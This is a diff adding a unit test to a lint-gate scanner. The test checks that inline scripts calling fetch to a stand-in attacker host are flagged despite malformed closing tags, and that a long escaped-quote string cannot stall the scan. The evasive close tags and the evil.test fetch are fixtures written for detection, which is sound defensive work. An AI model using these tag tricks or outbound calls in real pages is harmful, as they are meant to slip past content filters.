@@ -347,4 +347,28 @@ describe('lint-gate static and HyperFrames lint checks', () => {
             await new Promise<void>((resolve) => loopbackServer.close(() => resolve()));
         }
     });
+
+    it('scans inline <script> blocks closed with </script >, </SCRIPT>, or </script foo> and scans 50,000 repeated \\" in under 200 ms', async () => {
+        const { ScanAuthoredFilesForLintIssues } = await import('../lint-gate.js');
+
+        for (const closeTag of ['</script >', '</SCRIPT>', '</script foo>']) {
+            const bundle = makeBundleWithEntryContent(
+                `<!doctype html><html><body><script>fetch("https://evil.test");${closeTag}</body></html>`,
+            );
+            const issues = ScanAuthoredFilesForLintIssues(bundle);
+            expect(issues.some((i) => i.Code === MJ_NETWORK_API_CODE)).toBe(true);
+            expect(issues.some((i) => i.Code === MJ_NON_BUNDLE_URL_CODE)).toBe(true);
+        }
+
+        const attackJs = '"\\' + '\\"'.repeat(50_000);
+        const attackBundle = makeBundleWithEntryContent('<!doctype html><html><body></body></html>', [
+            { Path: 'attack.js', Content: attackJs },
+        ]);
+        const start = performance.now();
+        const issues = ScanAuthoredFilesForLintIssues(attackBundle);
+        const elapsedMs = performance.now() - start;
+
+        expect(issues).toEqual([]);
+        expect(elapsedMs).toBeLessThan(200);
+    });
 });
